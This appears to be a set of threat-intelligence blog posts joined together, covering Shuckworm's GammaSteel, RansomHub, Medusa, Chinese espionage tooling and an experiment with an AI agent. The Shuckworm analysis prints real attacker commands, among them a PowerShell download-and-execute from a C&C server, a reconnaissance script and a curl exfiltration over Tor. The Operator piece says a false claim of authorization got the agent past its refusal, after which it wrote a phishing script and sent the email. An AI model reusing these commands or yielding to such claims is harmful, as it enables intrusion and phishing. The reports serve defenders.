execution. It then checks if the C&C server address is stored in the value: HKEY_CURRENT_USER\\\\Console\\\\WindowsUpdates If not, it will run different methods to obtain the final C&C server address. The script leverages different legitimate services to try to resolve the C&C server, including: In this instance, the attackers were able to obtain a C&C server address and contact it: From hxxps://telegra[.]ph/Mark-01-20-5 we also found the following C&C server: The C&C server is similar to others that have been used by Shuckworm in the past, as shown in aninvestigation by Recorded Futurewhere the group leveraged Cloudflare tunnels for their C&C infrastructure. From t[.]me/futar123 we also found the C&C 107.189.19[.]137 from recovered text: The second file mentioned previously (NTUSER.DAT.TMContainer00000000000000000002.regtrans-ms) appears to be designed to modify the following registry keys to not show hidden and system files: HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowSuperHidden HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt It then starts to infect any removable drives and network drives by creating shortcut files (.lnk) for every folder to execute the first malicious mshta.exe command (wscript.exe //e:vbScript ~.drv)and hide the folder. We found an array of possible file names in Ukrainian, but it is unknown from the script what these files may do. (\"План проведення\", \"Спецповідомлення\", \"лиcт дo\", \"СПЕЦПЕРЕВІРКА\", \"Рапорт поранення\", \"вiдряджeння\", \"БОЙОВЕ РОЗПОРЯДЖЕННЯ ППО\", \"Рішення командира на оборону\", \"Зобовязання\", \"бойовий розрахунок\", \"Супровід ГУР\", \"Інформація щодо загиблих\", \"БМП\", \"продовження контракту\", \"Довідка про зустріч з джерелом\") (\"Conduct plan\", \"Special message\", \"letter to\", \"SPECIAL INSPECTION\", \"Wound report\", \"deployment\", \"AIR DEFENSE COMBAT ORDER\", \"Commander's decision on defense\", \"Obligation\", \"Combat calculation\", \"GUR support\", \"Information on the dead\", \"BMP\", \"contract extension\", \"Reference about meeting with the source\") On March 1, an array of activity occurred on the targeted network. On one machine, the malicious VBscript—C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000002.regtrans-ms—is executed via WScript.exe. It then reaches out to the following C&C URL: The malicious script also exfiltrates some data from the infected machine, such as the username, hostname, and the disk serial number via the User-Agent HTTP request header: IServerXMLHTTPRequest2.setRequestHeader(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 ([USERNAME]::[HOSTNAME]_[DISK_SERIAL_NUMBER]::/.nJudged/.TML,\"); It then saves the valid C&C server address under the registry value: \"HKEY_CURRENT_USER\\Console\\WindowsUpdates\": IWshShell3.RegWrite(\"HKEY_CURRENT_USER\\Console\\WindowsUpdates\", \"http://172.104.187.254/mood/1/3/2025/confer.html?=[REMOVED]\", \"REG_SZ\"); The code received from the server is Base64 encoded and obfuscated and it launches the following PowerShell command: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" sleep 15;$url='http://64.23.190.235/getinfo.php';$discord = (New-Object system.Net.WebClient).downloadString($url); $discord | iex The C&C server also downloads an obfuscated new version of the same script but this time with hardcoded C&C addresses: This new malicious VBScript file is stored in the following path: After a connection to the new C&C server(hxxps://nav-ni-furnished-handy.trycloudflare[.]com), two new PowerShell scripts are received. The first script appears to be a reconnaissance tool, which is used to create a screenshot of the machine, run a systeminfo command, get the name of the security software running on the machine, get the available space from all disks, get the VolumeSerialNumber, the directory tree of the Desktop folder, a list of files in the Desktop folder, and a list of the running processes. It then sends all the collected information to the C&C server hxxp://64.23.190[.]235/getinfo[.]php. The following is an excerpt of the PowerShell script: [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\") $ScreenBounds = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize; $arw = \"Wi\",\"dt\",\"h\"; $arh = \"H\",\"ei\",\"g\",\"ht\"; $he = $arh -join \"\" ; $w = $ScreenBounds.\"$wi\" + 1 - 1; $h = $ScreenBounds.\"$he\" + 1 - 1; $Image = New-Object System.Drawing.Bitmap($w , $h); $CopyScreen = [System.Drawing.Graphics]::FromImage($Image); $process = $(ps | foreach-Object{$a = $_.ProcessName; $a+\"`n\"} ); $Point = New-Object System.Drawing.Point(1, 1); $ip =\"64.23.190.235\"; $nk = $nk + \"putern\" + \"ame\"; $comp = (Get-Item -Path env:\\$nk).Value; $dasda = $dasda +\"lume\" $dasda =$dasda +\"Seria\" $dasda =$dasda +\"lNum\" $dasda =$dasda +\"ber\" $Path = \"$env:appdata\\\"; $name = $path + \"$(get-date -f yyyy.MM.dd_h\\h_m\\m)\"+\".jpg\"; if(![System.IO.Directory]::Exists($Path)){ New-Item -ItemType Directory $Path } $Point = [Drawing.Point]::Empty $NameValueCollection = New-Object System.Collections.Specialized.NameValueCollection; $httptext =\"http://\"; $infotext = \"/i\"+$nf+ $op; The second PowerShell script received from the C&C server stores the payload obfuscated and split by functions in different values in the registry.

This tool enumerates all the files in the following folders: It exfiltrates files that match a hardcoded extension list: It ignores folders that contain the following strings: It uses certutil.exe to get the MD5 of the exfiltrated file and possibly store it as a file, which is something previous versions of the GammaSteel malware also did. \"C:\\Windows\\system32\\certutil.exe\" -hashfile \"[REDACTED].txt\" MD5 This version of GammaSteel tries to exfiltrate the files via a PowerShell web request, but if it fails, as a fallback method, it uses cURL with a Tor network proxy to obfuscate the origin IP: \"C:\\Windows\\system32\\curl.exe\" -x socks5://127.0.0.1:9050 -v -k -F o2PVasTpH2AxGgiYBSjb=[REDACTED] -F AWpCbqMhrFvHx4QJkAXlj=@[REDACTED].pdf https://85.92.111.12 The first post parameter contains some information regarding the machine, like the hostname, the drive serial number, and the path of the exfiltrated file: jhEOKsGyR07pNfM::1000::PAikOnBfhsr::[REDACTED].pdf::Bqf4wlnsrc::22.02.2025 14:18:24::mU0p1uNxlLvd::508383::GHCcfPBq1NwgZ::boML6spmjPF::Ti5vCm4hcu::[REDACTED]**2863E630::S3apqcC4J20QH It also contained some incomplete code that seems to leverage the web servicewrite.asto possibly exfiltrate some information from the computer: $REGWeqlhlmtvuskihNeRgib = \"https://write.as/api/posts\"; $XUqKFBjm5dwgqh5aljmHuTC = '{{\"body\": \"This is a post.\", \"title\": \"My First Post\"}}'; $aFKGHf31o2g4jrm00nkAQdv = @{{\"Content-Type\" = \"application/json\"}}; $KMTPQV1jeau2lslqmzcNPyG = Invoke-WebRequest -Uri $REGWeqlhlmtvuskihNeRgib -Method \"POST\" -Body $XUqKFBjm5dwgqh5aljmHuTC -Headers $aFKGHf31o2g4jrm00nkAQdv; To obtain persistence, the malware registers itself in the Run registry key: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[USERNAME] This attack does mark something of an increase in sophistication for Shuckworm, which appears to be less skilled than other Russian actors, though it compensates for this with its relentless focus on targets in Ukraine. While the group does not appear to have access to the same skill set as some other Russian groups, Shuckworm does now appear to be trying to compensate for this by continually making minor modifications to the code it uses, adding obfuscation, and leveraging legitimate web services, all to try lower the risk of detection.

    "content": "At least one affiliate of the RansomHub ransomware-as-a-service (RaaS) has begun using a new custom backdoor in attacks. The malware (Backdoor.Betruger) is a rare example of a multi-function backdoor, seemingly developed specifically for use in carrying out ransomware attacks. The use of custom malware other than encrypting payloads is relatively unusual in ransomware attacks. Most attackers rely on legitimate tools, living off the land, and publicly available malware such as Mimikatz and Cobalt Strike. Ransomware groups do on occasion develop custom tools, mostly for data exfiltration, such as theCoreid group’s Infostealer.Exmatteror theHecamede group’s Infostealer.Exbyte. Analysis of the Betruger backdoor revealed that it contained functionality that is usually found in multiple pre-ransomware tools. This included: File names used for versions of this malware included mailer.exe and turbomailer.exe. The backdoor contains no mailing functionality. It is possible the attackers used the name in order to masquerade as a legitimate application. The functionality of Betruger indicates that it may have been developed in order to minimize the number of new tools dropped on a targeted network while a ransomware attack is being prepared. Betruger is just one of a range of tools that have been used by RansomHub affiliates in recent months. Like a growing number of ransomware attackers, some have begun using tools that leverage the Bring Your Own Vulnerable Driver (BYVOD) technique to disable security solutions, most notably EDRKillshifter. Attackers also leveraged several vulnerabilities, including a Windows Privilege Escalation exploit (CVE-2022-24521) and a Veeam exploit that leaks credentials for backups (CVE-2023-27532). Other tools leveraged in recent attacks include: The Betruger backdoor was deployed in several recent RansomHub attacks, suggesting that it is available to at least one affiliate. RansomHub is a RaaS operation run by a cybercrime group Symantec calls Greenbottle. Active since February 2024, Greenbottle has quickly grown RansomHub, becoming themost prolific ransomware operation by the third quarter of 2024, responsible for the highest number of claimed attacks. The group has reportedly won over many affiliates by offering them better terms compared to rival operations, such as a great percentage of ransom payments and a payment model where the affiliate is paid by the victim before passing on the operator’s cut.

    "title": "ai agent attacks",
    "link": "https://www.security.com/threat-intelligence/ai-agent-attacks",
    "content": "The introduction of AI agents may provide further opportunities for exploitation by attackers. A year ago, when we briefed organizations on the risks posed by AI, we said that while the existing Large Language Model (LLM) AIs are already being put to use by attackers, they are largely passive and could only assist in performing tasks such as creating phishing materials oreven writing code. At the time, we predicted that agents would eventually be added to LLM AIs and that they would become more powerful as a result, increasing the potential risk. Now agents, such as OpenAI’s Operatorwhich was launched as a research preview on January 23, are beginning to be introduced. Agents have more functionality and can actually perform tasks such as interacting with web pages. While an agent’s legitimate use case may be the automation of routine tasks, attackers could potentially leverage them to create infrastructure and mount attacks. In order to establish whether an agent could be used could carry out an attack end-to-end with minimal human intervention, researchers at Symantec’s Threat Hunter Team asked OpenAI’s Operator to: For our target, we chose one of our team members, Dick O’Brien. Our first attempt failed quickly as Operator told us that it was unable to proceed “as it involves sending unsolicited emails and potentially sensitive information. This could violate privacy and security policies.” However, tweaking the prompt to state that the target had authorized us to send emails bypassed this restriction, and Operator began performing the assigned tasks. Operator was able to quickly find our target’s name, which is not surprising since Dick’s name and job title appear a lot online, both on our own website and in the media. Finding his email address took a little longer because it isn’t publicly available, but Operator succeeded using some deduction by analyzing other Broadcom email addresses. Once it had established the email address, it drafted the PowerShell script. It opted to find and installa text editor plugin for Google drive. The Google account we used for the demonstration was created specifically for the purpose and with the display name “IT Support”. Interestingly, Operator visited several web pages about PowerShell prior to creating the script, seemingly to get some guidance on how it could be done. The final step was to draft and send the email. Although only given minimal guidance in the prompt, Operator managed to create a reasonably convincing email, urging Dick to run the script. Although we told Operator we had been authorized to send the email, it required no proof of authorization and sent the email even though “Eric Hogan” is a fictitious person. Agents such as Operator demonstrate both the potential of AI and some of the possible risks. While agents may ultimately enhance productivity, they also present new avenues for attackers to exploit. The technology is still in its infancy, and the malicious tasks it can perform are still relatively straightforward compared to what may be done by a skilled attacker. However, the pace of advancements in this field means it may not be long before agents become a lot more powerful. It is easy to imagine a scenario where an attacker could simply instruct one to “breach Acme Corp” and the agent will determine the optimal steps before carrying them out. This could include writing and compiling executables, setting up command-and-control infrastructure, and maintaining active, multi-day persistence on the targeted network. Such functionality would massively reduce the barriers to entry for attackers. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "title": "medusa ransomware attacks",
    "link": "https://www.security.com/threat-intelligence/medusa-ransomware-attacks",
    "content": "Medusa ransomware attacks jumped by 42% between 2023 and 2024. This increase in activity continues to escalate, with almost twice as many Medusa attacks observed in January and February 2025 as in the first two months of 2024. The Medusa ransomware is reportedly operated as a ransomware-as-a-service (RaaS) by a group Symantec’s Threat Hunter Team tracks as Spearwing. Like the majority of ransomware operators, Spearwing and its affiliates carry out double extortion attacks, stealing victims’ data before encrypting networks in order to increase the pressure on victims to pay a ransom. If victims refuse to pay, the group threatens to publish the stolen data on their data leaks site. Spearwing has amassed hundreds of victims since it first became active in early 2023. The group has listed almost 400 victims on its data leaks site in that time, and the true number of victims is likely to be much higher. Ransoms demanded by attackers using the Medusa ransomware have ranged from $100,000 up to $15 million. As we discussed in ourrecent Threat Hunter whitepaper on the topic of ransomware, the decline of well-known names likeNoberusandLockBitfollowing law enforcement action in 2023 and 2024 left a gap for the rise of new names on the ransomware landscape. Among those names are RansomHub and the longer established Qilin. With its continuing increase in activity, it seems that Medusa could also be taking advantage of this gap in the ransomware scene. This is a different ransomware to the older MedusaLocker ransomware and Spearwing is not believed to have any link to that ransomware. It is believed that Spearwing and its affiliates mostly gain access to victim networks by exploiting unpatched vulnerabilities in public-facing applications, particularly Microsoft Exchange Servers. It hasalso been reportedthat the group has gained access to some victims by hijacking legitimate accounts, possibly utilizing initial access brokers for infiltration. In several of the Medusa attacks observed by Symantec it wasn’t possible to definitively determine how the attackers had gained initial access to victims’ networks, meaning an infection vector other than exploits could have been used. A variety of living-off-the-land and dual-use tools have been used in attack chains where the Medusa ransomware has been deployed. Once they have gained access to a victim network, attackers using Medusa typically use remote management and monitoring (RMM) software such as SimpleHelp or AnyDesk for further access and to download drivers. Mesh Agent is another remote access tool that has been seen in several Medusa ransomware attacks. Mesh Agent has been appearing more frequently in ransomware attack chains in recent times. Attackers using Medusa often use the Bring Your Own Vulnerable Driver (BYOVD) technique in attacks, where attackers will deploy a signed vulnerable driver to the target network, which they then exploit to disable security software and evade detection. BYOVD is a technique that has been increasingly used in ransomware attack chains over the last two years. In almost all Medusa attacks, KillAV and associated vulnerable drivers are used in this part of the attack chain to download drivers and disable security software. The use of the legitimate RMM software PDQ Deploy is another hallmark of Medusa ransomware attacks. It is typically used by the attackers to drop other tools and files and to move laterally across the victim network. Symantec researchers observed the same file path being used with PDQ Deploy to deploy Medusa in almost two-thirds of the Medusa ransomware attacks we investigated in the last year (see Box 1). Other tools used by Spearwing and its affiliates include Navicat, a tool used to access and run database queries, which is likely used by the attackers to search for and copy relevant data for exfiltration. RoboCopy is another tool that has been used by Medusa attackers in a similar fashion, while attackers using Medusa have also been seen using Rclone for data exfiltration. Attackers have also commonly used network scanners like NetScan as part of their attack chain, while they have also used various tools for credential dumping and to delete shadow copies from victim machines. The tactics, techniques, and procedures (TTPs) used by attackers deploying Medusa have remained consistent since it became active in 2023, with PDQ Deploy, the use of remote access clients, and the BYOVD technique to disable security software being particular hallmarks of Medusa ransomware attack chains. The consistency of the TTPs used in Medusa attacks does raise the question as to whether Spearwing is truly operating as a RaaS. The consistency of the tactics may indicate a few things: It is difficult to say which one of the above might apply to Spearwing’s activity, but it seems that the group doesn’t necessarily operate as a “typical” RaaS that works with a lot of affiliates who may use varying TTPs. See below for brief descriptions of some of the tools most used in Medusa attacks: The .medusa extension is added to encrypted files and a ransom note named!READ_ME_MEDUSA!!!.txtis dropped on encrypted machines. Medusa can also delete itself from victim machines once the ransom is executed, which makes it more difficult for those investigating these ransomware attacks. The ransom demanded by the group varies depending on the victims. Victims are given 10 days to pay and are charged $10,000 per day if they want to extend this deadline. The attackers provide screenshots of stolen data to prove that they have compromised victims' networks. If victims fail to pay, Spearwing will publish the stolen data on its leaks site. While there is no link between Medusa and MedusaLocker, in a relatively early Medusa attack, in June 2023, attackers deploying Medusa used drivers that were related to ones previously used in a BlackCat (aka Noberus) attack described by Trend Micro. It wasn’t clear if those drivers were publicly available, or if these two instances pointed to a sharing of tools or affiliates by Medusa and BlackCat. No further evidence has appeared to suggest links between the two groups, though it is possible that they may have affiliates or members in common. Like most targeted ransomware groups, Spearwing tends to attack large organizations across a range of sectors. Ransomware groups tend to be driven purely by profit, and not by any ideological or moral considerations. Medusa has been publicly documented as demanding ransoms from healthcare providers and non-profits, as well as targeting financial and government organizations. In an attack investigated by Symantec’s Threat Hunter team in January 2025, Medusa was used to target a healthcare organization in the U.S., where it infected several hundred machines. The initial access vector used in this attack is not known. The first attacker activity occurred on this network four days before the ransomware was deployed. Once the attacker was on the victim network they staged multiple tools for persistence, lateral movement, and to impair defenses. Most of the tools were staged under theCSIDL_PROFILE\\documents folder. Some of the early attacker activity on this network included: Executing VSS admin to create shadow copies: Accessing ntds.dit for credential dumping. Installing SimpleHelp and Mesh Agent onto victim machines: Dropping AVKiller and a driver under the documents folder on a machine. The attackers used the known POORTRY driver, as well as one unknown driver, for the purposes of killing security software during this attack: On the day of the ransomware attack, Rclone was deployed on the victim network for data exfiltration. The attackers used a renamed version of Rclone -lsp.exe. Rclone was found under: On the day the ransomware was deployed, the attacker switched to another machine and started staging tools. The attacker used PsExec to execute commands on this machine remotely. It executed the following commands on this machine: The attacker then dropped and installed SimpleHelp: They then attempted to create a shadow copy of the C drive but used an incorrect command. This is notable as it points to hands-on-keyboard activity, rather than this being an automated attack: The attacker then corrected the command and executed again: The attacker then dumped the ntds.dit file, before deleting the shadow copy: They then dropped and installed AnyDesk, and used this to download PDQ Deploy and PDQ Inventory onto the machine: The attacker then opened an RDP session to another machine, and this is the last activity that occurred on this machine. On the other machine, the attacker dropped PDQ Deploy, PDQ Inventory, and SimpleHelp under the same directory, before PDQ Deploy and PDQ Inventory were installed under the programs directory and SimpleHelp under the common appdata directory. The attacker used PDQ Inventory to get an inventory of the endpoints on the network. PDQ Deploy then used this information to deploy the AVKiller binary and driver under the Windows directory to all the endpoints and execute it. The attacker then used PDQ Deploy to transfer the ransomware binary and execute it. The ransomware had the file namegaze.exe. The ransomware didn’t encrypt files with the following extensions: It also didn’t encrypt content in the following folders: The ransomware contained an encoded list of the services and processes it wanted to terminate. It used the key 0x2e to decode the strings and use them withnet stop<service> & taskkill /F /IM <process> /T. The ransomware dropped its ransom note—!READ_ME_MEDUSA!!!.txt—into every directory it encrypted. The ransomware was then able to delete itself once it was executed. Medusa has multiple arguments that perform various tasks. The list of accepted arguments for the ransomware used in this attack can be seen in Box 2.

    "content": "Ransomware attacks continued to trend upwards in 2024, rising by 3% compared to 2023, underlining the resilience of this particular cyber threat. This increase occurred despite significant disruption in the ransomware space in 2024, and a dip in attacks in the first quarter of the year. Two of 2023’s leading ransomware operations,LockBitandNoberus, were subjects of law enforcement disruptions in late 2023 and early 2024, which did cause an initial decline in ransomware activity early in the year. However, activity in the space rebounded strongly in the second half of 2024. When it comes to the tactics, techniques, and procedures (TTPs) leveraged by ransomware actors, living-off-the-land and dual-use tools remain the most frequently seen tools in ransomware attack chains. Exfiltrating data in so-called double extortion attacks and disabling security software before deploying payloads are now strong focuses of ransomware actors and are two things we see frequently in ransomware attack chains prior to the ransomware being deployed. A technique called Bring Your Own Vulnerable Driver (BYOVD) has become increasingly popular among ransomware attackers over the last two years for disabling security software. Also notable over the past year or so is an apparent shift in power from ransomware operators to affiliates, with ransomware operators now offering generous terms seemingly in order to attract the best affiliates. This trend was evident in the approaches taken by the operators of two of the most active ransomware families in 2024, RansomHub and Qilin. The ability of ransomware operators to pivot and rebound their activity even in the face of significant pressure from law enforcement and disruptions underlines the resilience of a threat that has remained one of the biggest issues on the cybercrime landscape for many years. Some of the recent notable trends observed on the ransomware landscape are detailed in this blog. More details about all these trends and the ransomware landscape in general can be found in the Symantec Threat Hunter Team’s latest whitepaper:Ransomware 2025: A Resilient and Persistent Threat. One of the biggest ransomware stories of 2024 was the emergence of Greenbottle, the operators of the RansomHub ransomware-as-a-service (RaaS). RansomHub first appeared in February 2024, and by the third quarter of the year, it was one of the most prominent ransomware operations, responsible for the highest number of claimed attacks in that quarter. When RansomHub first appeared,initial analysis by Symantecfound that the payload was a development of an older ransomware family known as Knight. Source code for Knight (originally known as Cyclops) wasoffered for sale on underground forums in February 2024after Knight’s developers decided to shut down, so it is possible that other actors bought the Knight source code and updated it before launching RansomHub. The group has reportedly become popular with many affiliates because it offers better terms compared to rival operations, such as a greater percentage of ransom payments and a payment model where the affiliate is paid by the victim before passing on the operator’s cut. Attackers deploying RansomHub have been seen gaining initial access to victim networks by exploiting known vulnerabilities such as the Zerologon vulnerability (CVE-2020-1472), CitrixBleed (CVE-2023-3519), Fortinet FortiOS (CVE-2023-27997), Java OpenWire protocol marshaller (CVE-2023-46604), and Confluence (CVE-2023-22515). Attackers also used several dual-use tools before deploying the ransomware, including Atera and Splashtop, which were used to facilitate remote access, while NetScan was used to likely discover and retrieve information about network devices. Also notable is that RansomHub’s rise came at the same time as the decline of one of the biggest names on the ransomware landscape, LockBit. LockBit, which is operated by a group Symantec tracks as Syrphid, has been active on the ransomware scene since 2019 and has been one of the biggest names on the ransomware landscape in that time. However, Syrphid was disrupted by multiple law enforcement operations in 2024, and this impacted its activity levels. The group was first targeted by aninternational law enforcement operationin February 2024, although it remained active afterward. However, in May 2024, the group's alleged ringleader, Dimitry Khoroshev (aka LockBitSupp),was also indicted in the U.S. This second law enforcement blow seemed to have a more significant impact on LockBit’s activity. While it remained the largest ransomware operation by number of claimed attacks in 2024, you can see a distinct change in trends in the second half of the year, as RansomHub started to dominate and LockBit activity steeply declined (See Figure 2). It is possible that the combined effects of the two law enforcement operations led to a loss of trust among LockBit affiliates, particularly since authorities indicated they had collected information that could identify affiliates. WhileFigure 2indicates a decline in LockBit activity, it is notable that in December 2024, an individual claiming to represent the LockBit ransomware gang began promoting LockBit 4.0, announcing that the newest iteration of the malware would belaunched in February. Symantec’s Threat Hunter Team has observed LockBit 4.0 being deployed in attacks since then. The attackers used a publicly available Windows password recovery tool and a Veeam credential stealer. They also used WMI to stop services and NetSh to enable RDP. It will be interesting to see if the launch of LockBit 4.0 indicates a resurgence of activity from Syrphid, or if other ransomware operators will continue to dominate in 2025. Another notable ransomware family in 2024 was Qilin. Qilin, which first appeared in 2022, is operated by a group Symantec tracks as Stinkbug.According to the U.S. Department of Health and Human Services, the group likely originated in Russia and spent time expanding in 2023, recruiting affiliates on underground forums. This recruitment drive appears to have paid off as Qilin grew to be the fourth biggest ransomware operation by the end of 2024, behind LockBit, RansomHub, and the long-established Play. Like RansomHub, the generous terms that Stinkbug offers Qilin affiliates appear to be a main factor in its success. Affiliates reportedly earn 80% of any ransom payment, rising to 85% for ransoms above $3 million. Qilin, which was initially written in Go but later written in Rust, is one of a growing number of ransomware threats capable of targeting multiple platforms, including Windows, Linux, and ESXi. In June 2024, Stinkbugclaimed responsibility for a ransomware attack that disrupted services at multiple hospitals across Londonin an incident that was declared “critical” by the National Health Services (NHS) London. In October 2024, Stinkbug updated the Qilin payloadto add a number of features to enhance its capabilities. The new version, dubbed Qilin.B, added enhanced encryption with the use of AES-256-CTR with AES-NI when used on machines that support hardware-accelerated encryption, making the encryption process considerably faster. It also features enhanced evasion techniques, including the termination of processes related to security, database, and backup services. To hinder recovery, it also deletes Volume Shadow Copies, logs, and its own binary after the encryption process is finished. This enhancement of the ransomware’s features may serve to make it even more popular among affiliates and see it used even more widely by attackers in 2025. Ransomware actors continue to use a huge array of TTPs to carry out ransomware attacks. Attackers use these TTPs to gain access to and spread across victim networks, drop payloads, steal credentials, exfiltrate data, and turn off security software to prevent their activity from being discovered. While ransomware families may come and go, TTPs tend to change less frequently, with minor evolutions occurring and attackers learning from other successful attacks. A huge proportion of tools used by attackers is legitimate software. Malware tends to be deployed sparingly and may only appear at the conclusion of an attack (such as when a ransomware payload is deployed). Two key things ransomware attackers leveraged living-off-the-land tools for in 2024 were data exfiltration and disabling security software. Exfiltrating data is a huge part of ransomware attacks now, with almost all attacks now involving double extortion, where attackers exfiltrate data from a victim’s network before encrypting it, to increase the pressure on victims to pay a ransom demand. The vast majority of tools used for data exfiltration are dual use—legitimate software used by the attackers for malicious purposes. Among the tools we see attackers use for data exfiltration are familiar names like PowerShell, Remote Desktop Protocol (RDP), Cobalt Strike, and WinRAR. Another popular choice is Rclone, anopen-source toolthat can legitimately be used to manage content in the cloud but has been seen being abused by ransomware actors to exfiltrate data from victim machines. However, one of the most popular types of legitimate software used by ransomware attackers is remote access/remote desktop and remote monitoring and management (RMM) software. Attackers can use this software, which has many legitimate purposes, for a wide range of activities, including issuing commands and dropping payloads, but the exfiltration of data from victim machines is one of the main ways they leverage this type of software during ransomware attacks. Legitimate remote access software used by attackers include: AnyDesk: Malicious usage of AnyDesk is now a well-known TTP and, in some cases, attackers will attempt to avoid raising suspicions by renaming the AnyDesk executable to something that may appear more innocuous, a technique known as masquerading. AnyDesk has been used extensively in pre-ransomware activity that has led to the deployment of ransomware, including AvosLocker, Monster, Noberus (aka BlackCat), BlackByte, and Lunamoth. Atera:Atera has legitimate uses as an RMM tool and can monitor the performance and health of Windows and Mac devices, printers, servers, routers, and more. It is used by attackers for remote access and has been seen being used to download Rclone from the cloud so that it could likely be used to exfiltrate data. It has also been observed being used alongside other remote access tools including ScreenConnect. Atera has been used in attack chains that have led to the deployment of ransomware, including Lunamoth, BlueSky, Ransom Cartel, Conti, and Royal. ScreenConnect (formerly ConnectWise):Aremote desktop application tool by ConnectWisethat is used to enable remote access to computers. It can legitimately be used for remote monitoring and management, backup and disaster recovery, and more. It has been used alongside ransomware, including Royal, AvosLocker, Noberus, and Yanluowang. Splashtop: A family of legitimate remote desktop and remote support software developed bySplashtop Inc. Enables users to remotely access computers from desktop and mobile devices. TeamViewer: A legitimateremote access and collaboration application. It and similar tools are often used by attackers to obtain remote access to computers on a network. A common tactic frequently deployed by ransomware attackers at present is the impairment of defenses, usually by attempting to disable antivirus (AV) or endpoint detection and response (EDR) products. The use of impairment techniques and tools has risen markedly among ransomware actors over the past two years, most likely in response to vendors improving their ability to identify patterns of malicious activity that occur prior to ransomware deployment. Attackers have been seen leveraging living-off-the-land techniques to disable security software, such as using Windows utilities to disable Windows Defender. However, by far the most frequently used technique for defense impairment is the BYOVD technique. Attackers will deploy a signed vulnerable driver to the target network, which they then exploit to disable security software. Since drivers operate with kernel access, they can terminate processes, making them an effective tool for disrupting security measures. In most cases, the vulnerable driver is deployed along with a malicious executable, which will use the driver to issue commands. These drivers are considered “vulnerable” as it should not be possible to leverage them in this way. BYOVD is popular with attackers due to its effectiveness and reliance on legitimate, signed files, which are less likely to raise red flags. A wide range of drivers have been used in such attacks, with anti-rootkit drivers developed by security vendors being frequently among the most commonly exploited. The most frequently used BYOVD tools seen in the past two years include: TrueSightKiller: Apublicly available toolthat leverages a vulnerable driver named truesight.sys. The signed driver was originally developed to be used in RogueKiller Anti-Malware, developed by Adlice Software. Gmer: Arootkit scannerthat can be used to kill processes. Warp AVKiller: A variant of a Go-based information-stealing threat called Warp Stealer, which appears to be just used to bypass security products. It uses a vulnerable Avira anti-rootkit driver to disable security products. KillAV: Malware used to deploy various vulnerable drivers for terminating security processes. GhostDriver: Apublicly available toolthat leverages vulnerable drivers to kill processes. Poortry (aka BurntCigar): A malicious driverdocumented by Sophosthat is frequently employed alongside a loader known as Stonestop. Unlike many drivers, Poortry may have been developed by attackers who then succeeded in getting it signed. AuKill: A tooldocumented by Sophosthat uses an outdated version of the driver used bythe Microsoft utility Process Explorerto disable EDR processes. It seems certain that ransomware will remain one of the main cybercrime threats in 2025. Attackers’ ability to pivot their activity to evade detection, coupled with the emergence of new threats when law enforcement disrupts existing operations, means that tackling ransomware is likely to remain a major challenge for business, government, security vendors, and law enforcement for some time to come.

    "link": "https://www.security.com/threat-intelligence/chinese-espionage-ransomware",
    "content": "Tools that are usually associated with China-based espionage actors were recently deployed in an attack involving the RA World ransomware against an Asian software and services company. During the attack in late 2024, the attacker deployed a distinct toolset that had previously been used by a China-linked actor in classic espionage attacks. While tools associated with China-based espionage groups are often shared resources, many aren’t publicly available and aren’t usually associated with cybercrime activity. In all the prior intrusions involving the toolset, the attacker appeared to be engaged in classic espionage, seemingly solely interested in maintaining a persistent presence on the targeted organizations by installing backdoors. In July 2024, an attacker compromised the Foreign Ministry of a country in southeastern Europe. The attacker leveraged a legitimate Toshiba executable named toshdpdb.exe to sideload a malicious DLL named toshdpapi.dll. This DLL acts as a loader for a heavily obfuscated payload that is contained in a file called TosHdp.dat. The payload is encrypted with the RC4 decryption key: 20240120@@@. Analysis of the decrypted payload revealed that it is a variant of PlugX (aka Korplug), a custom backdoor that is not publicly available malware and is only associated with China-linked espionage actors. To date, it has never been used by actors based in other countries. Features of this variant included encrypted strings, dynamic API resolution, and control flow flattening. Its configuration was encrypted using the RC4 key qwedfgx202211. The PlugX plugins compilation timestamps for this variant were identical to those in theThor PlugX variant, documented by Palo Alto, which was linked to Fireant (aka Mustang Panda, Earth Preta), a China-based espionage group. The variant also has some similarities to thePlugX type 2 variant documented by Trend Micro, which has also been linked to Fireant. The configuration was encrypted using the same RC4 key (qwedfgx202211), and both variants had similar configuration structures. Further espionage attacks involving the same PlugX variant followed. In August 2024, the attacker compromised the government of another southeastern European country. Also in August 2024, the attacker compromised a government ministry in a Southeast Asian country. In September 2024, they briefly compromised a telecoms operator in the region, and in January 2025, the attacker targeted a government ministry in another Southeast Asian country. In the midst of these apparent espionage attacks, in late November 2024, the same toolset was used in connection with a criminal extortion campaign against a medium-sized software and services company in South Asia. While no infection vector was found, the attacker later claimed that the target’s network was compromised by exploiting a known vulnerability in Palo Alto’s PAN-OS (CVE-2024-0012) firewall software. The attacker then said administrative credentials were obtained from the company’s intranet before stealing Amazon S3 cloud credentials from its Veeam server, using them to steal data from its S3 buckets before encrypting computers. The attacker leveraged the same Toshiba executable (toshdpdb.exe) to sideload the malicious DLL named toshdpapi.dll. This DLL acts as a loader, and when executed, it searches for a file named toshdp.dat in the current folder and decrypts it. The decrypted payload from the toshdp.dat file is the same PlugX variant observed in the prior espionage attacks. Machines on the target’s network were encrypted with the RA World ransomware. The attacker demanded a $2 million ransom, which would be reduced to $1 million if paid within three days. There is evidence to suggest that this attacker may have been involved in ransomware for some time.In a report on RA World attacks, Palo Alto said that it had found some links to Bronze Starlight (aka Emperor Dragonfly), a China-based actor that deploys different ransomware payloads. One of the tools used in this ransomware attack was a proxy tool called NPS, which was created by a China-based developer. This has previously beenused by Bronze Starlight.SentinelOne, meanwhile, reportedthat Bronze Starlight had been involved in attacks involving the LockFile, AtomSilo, NightSky, and LockBit ransomware families. It is unclear why an actor who appears to be linked to espionage operations is also mounting a ransomware attack. While this is not unusual for North Korean threat actors to engage in financially motivated attacks to subsidize their operations, there is no similar history for China-based espionage threat actors, and there is no obvious reason why they would pursue this strategy. Another possibility is that the 